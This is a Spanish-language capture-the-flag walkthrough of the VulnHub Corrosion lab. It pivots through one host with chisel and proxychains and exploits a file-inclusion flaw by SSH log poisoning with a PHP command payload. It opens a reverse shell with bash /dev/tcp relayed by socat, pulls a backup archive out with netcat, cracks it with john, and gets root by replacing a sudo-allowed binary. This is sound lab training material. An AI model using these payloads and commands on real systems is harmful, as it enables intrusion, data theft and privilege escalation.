Ejecutar chisel desde el servidor, recordar que se debe tener permisos de ejecución.
```java
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/content]
└─# ./chisel server --reverse -p 1234
2023/01/20 12:25:24 server: Reverse tunnelling enabled
2023/01/20 12:25:24 server: Fingerprint e/uTC7zOwR/RM4G/wjk+wrwIaSz0UQPLSrDsOZwfAi8=
2023/01/20 12:25:24 server: Listening on http://0.0.0.0:1234
```
Para establecer la conexion pivot desde el equipo `corrosion1`, se debe ejecutar chisel desde el equipo `corrosion2`, y establecer la conexion desde el equipo `192.168.210.129`; estableciendo la `ip:port` se peude hacer la reenvío del servicio publicado en el puerto 80.
```java
bash-5.0# ./chisel client 192.168.200.147:1234 R:80:192.168.210.129:80
2023/01/20 10:30:59 client: Connecting to ws://192.168.200.147:1234
2023/01/20 10:30:59 client: Connected (Latency 1.39229ms)
```
Tambien se puede establecer la conexion para todas las comunicaciones desde el equipo corrosion1 mediante sock, redirigir todas las comunicaciones establecidas.
```java
bash-5.0# ./chisel client 192.168.200.147:1234 R:socks
2023/01/20 10:33:45 client: Connecting to ws://192.168.200.147:1234
2023/01/20 10:33:45 client: Connected (Latency 1.129892ms)
```
Cuando se establece la comunicación mediante socks, se debe configurar la comunicacións `sokcs5` en el archivo `/etc/proxychains4.conf`.
```java
ProxyList
# add proxy here
# meanwile
# defaults set to "tor"
# socks4    127.0.0.1 9050
socks5  127.0.0.1 1080
```
Una vez establecida la conexión, mediante chisel, podemos utilizar proxychains para hacer escaneo al equipos `corrosion1`.
```java
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/nmap]
└─# proxychains4 whatweb http://192.168.210.129
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.210.129:80  ...  OK
http://192.168.210.129 [200 OK] Apache[2.4.46], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.46 (Ubuntu)], IP[192.168.210.129], Title[Apache2 Ubuntu Default Page: It works]
```                                                                                                                               
Escaneo de nmap con proxychains
```java
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/nmap]
└─# proxychains nmap --top-ports 1000 -sT -Pn --open -T5 -vvvv -n 192.168.210.129 -oG allPortsc1 2>/dev/null
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-20 12:55 -05
Initiating Connect Scan at 12:55
Scanning 192.168.210.129 [1000 ports]
Discovered open port 80/tcp on 192.168.210.129
Discovered open port 22/tcp on 192.168.210.129
Completed Connect Scan at 12:55, 4.64s elapsed (1000 total ports)
Nmap scan report for 192.168.210.129
Host is up, received user-set (0.0052s latency).
Scanned at 2023-01-20 12:55:50 -05 for 5s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.77 seconds
```
Escaneo de nmap utilizando hilos con xagrs, recoore todos los puertos 
```java          
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/nmap]
└─# seq 1 65535 | xargs -P 50 -I{} proxychains nmap -p{} -sT -Pn --open -T5 -vvvv -n 192.168.210.129 -oG allPortsc1 2>/dev/null | grep open
Discovered open port 22/tcp on 192.168.210.129
22/tcp open  ssh     syn-ack
Discovered open port 80/tcp on 192.168.210.129
80/tcp open  http    syn-ack
```
Una vez identificado los puertos abiertos, para navergar directamente a la IP 192.168.210.129, se debe configurar un servidor proxyweb por la comunicación socks5.
> ![alt text](https://i.postimg.cc/nzCmmMXt/foxyproxy.png)

Una configurado se puede ingresar por el explorador usando directamente la `192.168.210.129`, una vez validado que existe el servidor web, podemos hacer enumeracion con gobuster utilizando las comunicación de socks5, pasando por el proxy.
```java
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/nmap]
└─# gobuster dir -u http://192.168.210.129 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --proxy socks5://127.0.0.1:1080
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.210.129
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] Proxy:                   socks5://127.0.0.1:1080
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/20 13:39:14 Starting gobuster in directory enumeration mode
===============================================================
/tasks                (Status: 301) [Size: 318] [--> http://192.168.210.129/tasks/]
/blog-post            (Status: 301) [Size: 322] [--> http://192.168.210.129/blog-post/]
```
Verificar la URL

http://192.168.210.129/tasks/tasks_todo.txt

y poner imagen

Ver laURL
http://192.168.210.129/blog-post

y poner imagen

Enumeracio de blog-post
```java
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/nmap]
└─# gobuster dir -u http://192.168.210.129/blog-post -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --proxy socks5://127.0.0.1:1080
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.210.129/blog-post
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] Proxy:                   socks5://127.0.0.1:1080
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/20 13:45:35 Starting gobuster in directory enumeration mode
===============================================================
/archives             (Status: 301) [Size: 331] [--> http://192.168.210.129/blog-post/archives/]
/uploads              (Status: 301) [Size: 330] [--> http://192.168.210.129/blog-post/uploads/]
```
Fuzzing con parametros usando gobuster
```java
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/nmap]
└─# gobuster fuzz -u http://192.168.210.129/blog-post/archives/randylogs.php?FUZZ=/etc/passwd -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --proxy socks5://127.0.0.1:1080 | grep -v "Length=0"
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://192.168.210.129/blog-post/archives/randylogs.php?FUZZ=/etc/passwd
[+] Method:       GET
[+] Threads:      20
[+] Wordlist:     /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Proxy:        socks5://127.0.0.1:1080
[+] User Agent:   gobuster/3.4
[+] Timeout:      10s
===============================================================
2023/01/20 13:54:09 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=200] [Length=2832] http://192.168.210.129/blog-post/archives/randylogs.php?file=/etc/passwd
```
Con el escaneo de paramteros podemos validar que existe un parametro que permite la lectura de archivos, por lo que, podemos validar si listar el archivo `/etc/passwd.` 
```java
http://192.168.210.129/blog-post/archives/randylogs.php?file=/etc/passwd

root:x:0:0:root:/root:/bin/bash
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:126:131:Gnome Display Manager:/var/lib/gdm3:/bin/false
randy:x:1000:1000:randy,,,:/home/randy:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:127:65534::/run/sshd:/usr/sbin/nologin
```
Con verificación de lectura de arhivos se podemos buscar la factibilidad de listar `/var/log/auth.log`, y con esto se puede verificar si se puede hacer inyeccion mediante envenamiento de logs. 

```java
http://192.168.210.129/blog-post/archives/randylogs.php?file=/var/log/auth.log

┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/nmap]
└─# proxychains ssh "<?php system('whoami'); ?>"@192.168.210.129
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.210.129:22  ...  OK
The authenticity of host '192.168.210.129 (192.168.210.129)' can't be established.
ED25519 key fingerprint is SHA256:h+1ijitcr/kVnfc33XfHyMIJifcp2Vt9He9qc+ph1Xk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.210.129' (ED25519) to the list of known hosts.
<?php system('whoami'); ?>@192.168.210.129's password: 
Permission denied, please try again.
<?php system('whoami'); ?>@192.168.210.129's password: 
Permission denied, please try again.
<?php system('whoami'); ?>@192.168.210.129's password: 
```
Mediante ssh podemos verificar si se puede hacer inyeccion php para generar envenenamiento de logs, se puede validar que se puede hacer inyenccion de codigo, por lo que, con la sentencia enviada `<?php system('whoami'); ?>@192.168.210.129'`, y volvemos a cargar la url para buscar la inyeccción del log.
```java
http://192.168.210.129/blog-post/archives/randylogs.php?file=/var/log/auth.log

an 20 16:51:01 corrosion CRON[1604]: pam_unix(cron:session): session closed for user root
Jan 20 16:51:45 corrosion sshd[1607]: Invalid user www-data
 from 192.168.210.128 port 41466
Jan 20 16:51:48 corrosion sshd[1607]: Failed none for invalid user www-data
 from 192.168.210.128 port 41466 ssh2
Jan 20 16:51:49 corrosion sshd[1607]: Failed password for invalid user www-data
 from 192.168.210.128 port 41466 ssh2
Jan 20 16:51:49 corrosion sshd[1607]: Failed password for invalid user www-data
 from 192.168.210.128 port 41466 ssh2
Jan 20 16:51:49 corrosion sshd[1607]: Connection closed by invalid user www-data
```
Comprobado la inyeccion de comandos, enviamos una inyección mediante parametro `cmd` y escapando el signo `$`, para evitar errores.
```java     
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/nmap]
└─# proxychains ssh "<?php system(\$_GET['cmd']); ?>"@192.168.210.129
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.210.129:22  ...  OK
<?php system($_GET['cmd']); ?>@192.168.210.129's password: 
Permission denied, please try again.
```
Para verificar al inyección hacemos una petición del comando cms inyectado. `randylogs.php?file=/var/log/auth.log&cmd=ls`
```java
view-source:http://192.168.210.129/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=ls
Jan 20 17:17:03 corrosion sshd[1491]: Invalid user randylogs.php
```
Una vez validado que existe conexion volvemos a generar una conexion ssh a la equipo corrosion 2 con el usuario randy para hacer y elevamos privilegios usando bash
```java
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/content]
└─# ssh randy@192.168.200.151 
randy@192.168.200.151's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.11.0-34-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
413 updates can be applied immediately.
304 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable
New release '22.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.
Last login: Fri Jan 20 17:35:36 2023 from 192.168.200.147
-bash-5.0$ bash -p
bash-5.0# 
```
Considerando que no hay comunicación directa, debemos establecer un reenvío de comunicaciones desde el equipo corrosion1 al corrosion2 y de ahi al equipo atacante, para generar una shell reversa del equipo corrosion 1 al equipo atacante, utilizaremos [socats](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)
```java
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/content]
└─# wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
--2023-01-20 19:47:35--  https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
Resolviendo github.com (github.com)... 140.82.112.4
Conectando con github.com (github.com)[140.82.112.4]:443... conectado.
Petición HTTP enviada, esperando respuesta... 302 Found
```
Una vez descargado se lo puede importar a la maquina corrosion 2 utilizando un servidor web y descagando con wget, cabe recalcar que se debe establecer permisos de ejecución.
```java
bash-5.0# wget http://192.168.200.147:8888/socat
--2023-01-20 17:57:24--  http://192.168.200.147:8888/socat
Connecting to 192.168.200.147:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 375176 (366K) [application/octet-stream]
Saving to: ‘socat’
socat   100%[====================================================================================================>] 366.38K  --.-KB/s    in 0.006s  
2023-01-20 17:57:24 (63.1 MB/s) - ‘socat’ saved [375176/375176]
bash-5.0# chmod +x socat 
```
Para establecer la comunicación mediante socats ponemos en escucha un puerto y toda la comnunicación que viene por ese puerto sea reenviado al equipo atacante.
```java
bash-5.0# ./socat TCP-LISTEN:4646,fork TCP:192.168.200.147:443
```

Para lanzar shell por la url, apuntamos al puerto 4646, por lo que, usamos el redireccionamiento enviando al equipo corrosion2 192.168.210.128 y esto enviará la comunicación al equipo atacante.

```java
http://192.168.210.129/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=bash -c "bash -i >%26 /dev/tcp/192.168.210.128/4646 0>%261"

┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/content]
└─# nc -nlvp 443                                                
listening on [any] 443 ...
connect to [192.168.200.147] from (UNKNOWN) [192.168.200.151] 37966
bash: cannot set terminal process group (892): Inappropriate ioctl for device
bash: no job control in this shell
www-data@corrosion:/var/www/html/blog-post/archives$ 
```

En el equipo corrosion1 hacemos la transferencia del archivo con el siguiente comando, 
```java
www-data@corrosion:/var/backups$ nc 192.168.210.128 4646 < user_backup.zip 
```

En la ejecución anterior se puede ver que el tráfico fue reenviado del equipo corrosion2, y el siguiente paso es hacer el tratamiento de la tty. Listamos los archivos vamos hasta la ruta /var/backups y descargamos el archivo `user_backups.zip` utilizando nc, por lo que primero ponemos en escucha el puerto y lo recibido enviamos a un archivo
```java
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/content]
└─# nc -nlvp 443 > user_backup.zip
listening on [any] 443 ...
```
Una vez recibido el archivo podemos verificar la conexion de nc 
```java
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/content]
└─# nc -nlvp 443 > user_backup.zip
listening on [any] 443 ...
connect to [192.168.200.147] from (UNKNOWN) [192.168.200.151] 37988
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/content]
└─# ls -la | grep user_
.rw-r--r-- root       root       3.2 KB Fri Jan 20 20:23:47 2023 user_backup.zip
```
Verificamos que el archivo esta cifrado por lo que obtenmos un hash para empezar la ruptura del hash.
```java
┌──(root㉿kali)-[/home/…/vulnhub/corrosion2/content/corrosion1]
└─# zip2john user_backup.zip > hash     
ver 2.0 efh 5455 efh 7875 user_backup.zip/id_rsa PKZIP Encr: TS_chk, cmplen=1979, decmplen=2590, crc=A144E09A ts=0298 cs=0298 type=8
ver 2.0 efh 5455 efh 7875 user_backup.zip/id_rsa.pub PKZIP Encr: TS_chk, cmplen=470, decmplen=563, crc=41C30277 ts=029A cs=029a type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** user_backup.zip/my_password.txt PKZIP Encr: TS_chk, cmplen=35, decmplen=23, crc=21E9B663 ts=02BA cs=02ba type=0
ver 2.0 efh 5455 efh 7875 user_backup.zip/easysysinfo.c PKZIP Encr: TS_chk, cmplen=115, decmplen=148, crc=A256BBD9 ts=0170 cs=0170 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

utilizamos Lohn de Ripper para descifrar la contrasela utilizando fuerza bruta.
```java 
┌──(root㉿kali)-[/home/…/vulnhub/corrosion2/content/corrosion1]
└─# john -w:/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!randybaby       (user_backup.zip)     
1g 0:00:00:01 DONE (2023-01-20 20:34) 0.6944g/s 9960Kp/s 9960Kc/s 9960KC/s "2parrow"..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Con la credencial encontrada `!randybaby`podemo descomprimir el archivo user_backup.zip
```java 
┌──(root㉿kali)-[/home/…/vulnhub/corrosion2/content/corrosion1]
└─# 7z x user_backup.zip           
7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_EC.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz (806EA),ASM,AES-NI)
Scanning the drive for archives:
1 file, 3285 bytes (4 KiB)
Extracting archive: user_backup.zip
--
Path = user_backup.zip
Type = zip
Physical Size = 3285  
Enter password (will not be echoed):
Everything is Ok
Files: 4
Size:       3324
Compressed: 3285
```
Una vez descifrado el archivo podemos ver el archivo `my_password.txt`, y con esas credenciales cambiar al usuario randy
```java
┌──(root㉿kali)-[/home/…/vulnhub/corrosion2/content/corrosion1]
└─# ls                                  
 credentials   easysysinfo.c   hash   id_rsa   id_rsa.pub   my_password.txt   user_backup.zip
                         
┌──(root㉿kali)-[/home/…/vulnhub/corrosion2/content/corrosion1]
└─# cat my_password.txt 
───────┬─────────────────────────────────────────────────────────────
       │ File: my_password.txt
───────┼─────────────────────────────────────────────────────────────
   1   │ randylovesgoldfish1998
───────┴─────────────────────────────────────────────────────────────
```
Listamos los si hay archivos con privilegios
```java
randy@corrosion:~$ sudo -l
[sudo] password for randy: 
Sorry, try again.
[sudo] password for randy: 
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /home/randy/tools/easysysinfo
randy@corrosion:~$ 
```
Con el comadno file podemos ver que tipo de archivo es, una vez, que identificamos que es una archivo binario lo borramos y creamos una archivo test.c para despues compilar 
```java
randy@corrosion:~/tools$ rm -rf easysysinfo
randy@corrosion:~/tools$ touch test.c
randy@corrosion:~/tools$ nano test.c 
```
Dentro del archivo test.c, creamos un archivo exploit tipo lenguaje c.
```java
#include <stdio.h>
#include <stdlib.h>

int main(void){
        system("/bin/bash");
        return 0;
}
```
Compilamos el archivo creado para hacerlo binario y remplazando con el nombre del archivo borrado.
```java
gcc test.c -o easysysinfo
```
Una vez compilado el binario volvemos a verificar los arvchivos con privelegios y lo ejecutamos.
```java
randy@corrosion:~/tools$ sudo -l
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User randy may run the following commands on corrosion:
    (root) PASSWD: /home/randy/tools/easysysinfo
randy@corrosion:~/tools$ ls -la
total 32
drwxrwxr-x  2 randy randy  4096 Jan 20 18:59 .
drwxr-x--- 17 randy randy  4096 Jul 30  2021 ..
-rwxrwxr-x  1 randy randy 16104 Jan 20 18:59 easysysinfo
-rwxr-xr-x  1 root  root    318 Jul 29  2021 easysysinfo.py
-rw-rw-r--  1 randy randy    92 Jan 20 18:55 test.c
```
Ejecutamos el archivo con privilegios
```java
randy@corrosion:~/tools$ sudo -u root /home/randy/tools/easysysinfo
root@corrosion:/home/randy/tools# whoami
root
root@corrosion:/home/randy/tools# cd ~
root@corrosion:~# ls -la
total 52
drwx------  7 root root 4096 Jul 30  2021 .
drwxr-xr-x 20 root root 4096 Jul 29  2021 ..
-rw-r--r--  1 root root  461 Jul 30  2021 .bash_history
-rw-r--r--  1 root root 3106 Aug 14  2019 .bashrc
drwx------  2 root root 4096 Apr 20  2021 .cache
drwx------  3 root root 4096 Jul 30  2021 .config
drwxr-xr-x  2 root root 4096 Jul 30  2021 creds
drwxr-xr-x  3 root root 4096 Jul 29  2021 .local
-rw-r--r--  1 root root   10 Jan 20 19:01 logs.txt
-rw-r--r--  1 root root  161 Sep 16  2020 .profile
-rw-r--r--  1 root root  251 Jul 30  2021 root.txt
-rw-r--r--  1 root root   66 Jul 30  2021 .selected_editor
drwxr-xr-x  3 root root 4096 Jul 29  2021 snap
-rw-r--r--  1 root root    0 Jul 30  2021 .sudo_as_admin_successful
root@corrosion:~# cat root.txt 
FLAG: 4NJSA99SD7922197D7S90PLAWE 

Congrats! Hope you enjoyed my first machine posted on VulnHub! 
Ping me on twitter @proxyprgrammer for any suggestions.

Youtube: https://www.youtube.com/c/ProxyProgrammer
Twitter: https://twitter.com/proxyprgrammer
root@corrosion:~# 
```

